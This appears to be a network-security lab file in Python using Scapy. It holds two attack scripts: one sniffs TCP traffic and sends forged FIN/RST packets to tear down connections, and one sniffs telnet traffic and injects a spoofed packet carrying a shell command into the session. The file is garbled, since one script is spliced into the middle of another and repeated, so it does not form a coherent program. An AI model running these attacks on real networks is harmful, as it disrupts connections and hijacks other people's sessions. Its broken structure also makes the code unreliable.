from scapy.all import *


def my_sniff():
    pkt=sniff(iface='br-37d209eea436', filter='tcp',prn=my_rstAttack)

def my_rstAttack(pkt):
    #pkt.show()
    #IP
    ip=IP()from scapy.all import *


def my_sniff():
    pkt=sniff(iface='br-37d209eea436', filter='tcp',prn=my_rstAttack)

def my_rstAttack(pkt):
    #pkt.show()
    #IP
    ip=IP()
    ip.src=pkt[IP].dst
    ip.dst=pkt[IP].src
    #TCP
    tcp=TCP()
    tcp.sport=pkt[TCP].sport
    tcp.dport=pkt[TCP].dport
    tcp.seq=pkt[TCP].ack
    tcp.ack=pkt[TCP].seq+1
    tcp.flags=0x14#"FR" #FIN & RST flag
    print("[] INFO MY CRAFTED RST PACKET...")
    print("tcp.sport:",tcp.sport)
    print("tcp.dport:",tcp.dport)
    print("tcp.seq:",tcp.seq)
    print("tcp.ack:",tcp.ack)
    print("-"*80)
    
    reset_pkt=ip/tcp
    print("[+] Sending rst packet ...")
    send(reset_pkt)

 
if __name__=="__main__":
    my_sniff()
    

    ip.src=pkt[IP].dst
    ip.dst=pkt[IP].src
    #TCP
    tcp=TCP()from scapy.all import *

#command = ""


def my_sniff():
    pkt=sniff(iface='br-37d209eea436', filter='dst port 23',prn=my_sessionHijacking)

def my_sessionHijacking(pkt):
    pkt.show()
    command = Raw(load="\r\ntouch prova.txt\r\n")
    print("[] command:",command)
    #IP
    ip=IP()
    ip.src=pkt[IP].src
    ip.dst=pkt[IP].dst
    ip.id=pkt[IP].id+1
    #TCP
    tcp=TCP()
    tcp.sport=pkt[TCP].sport
    tcp.dport=pkt[TCP].dport
    tcp.seq=pkt[TCP].seq
    tcp.ack=pkt[TCP].ack
    tcp.flags=0x18#"ACK PSH flag
    command_pkt=ip/tcp
    print("[+] Sending command ...")
    send(command_pkt/command)

 
if __name__=="__main__":
    #command = input("[+] Insert command to launch:")
    my_sniff()
    
    

    tcp.sport=pkt[TCP].sport
    tcp.dport=pkt[TCP].dport
    tcp.seq=pkt[TCP].ack
    tcp.ack=pkt[TCP].seq+1
    tcp.flags=0x14#"FR" #FIN & RST flag
    print("[] INFO MY CRAFTED RST PACKET...")
    print("tcp.sport:",tcp.sport)
    print("tcp.dport:",tcp.dport)
    print("tcp.seq:",tcp.seq)
    print("tcp.ack:",tcp.ack)
    print("-"*80)
    
    reset_pkt=ip/tcp
    print("[+] Sending rst packet ...")
    send(reset_pkt)

 
if __name__=="__main__":
    my_sniff()
    
